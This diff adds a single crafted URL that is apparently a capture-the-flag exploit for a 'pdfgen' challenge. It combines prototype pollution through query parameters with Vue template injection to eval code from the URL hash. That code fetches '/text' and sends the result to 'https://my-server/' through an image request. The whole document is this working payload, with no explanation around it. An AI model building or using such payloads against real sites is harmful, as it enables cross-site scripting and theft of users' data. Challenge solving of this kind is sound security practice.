@@ -1,0 +1,6 @@
+https://pdfgen.ctf.zer0pts.com:8443/text?
+text=%3Cxss%3Eey%3C/xss%3E
+&a[constructor][prototype][v-bind:class]=
+Math.constructor.constructor(%27eval(unescape(location.hash.slice(1)))%27)()
+#main=async%20function(){new%20Image().src='https://my-server/?'%2B(await%20(await%20fetch('/text')).text())};
+main()
